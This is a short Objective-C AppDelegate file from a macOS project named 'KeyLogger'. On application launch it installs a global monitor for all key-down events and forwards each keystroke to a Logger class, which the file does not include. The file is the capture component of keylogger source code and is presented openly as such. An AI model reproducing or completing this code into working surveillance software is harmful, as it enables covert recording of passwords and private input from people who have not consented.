//
//  AppDelegate.m
//  KeyLogger
//
//  Created by Dillon-Dev on 3/30/14.
//  Copyright (c) 2014 Dillon-Dev. All rights reserved.
//

#import "AppDelegate.h"

@implementation AppDelegate

- (void)applicationDidFinishLaunching:(NSNotification *)aNotification
{
    [NSEvent addGlobalMonitorForEventsMatchingMask:NSKeyDownMask handler:^(NSEvent *event) {
        [Logger handleKeyPress:event];
    }];
}


@end
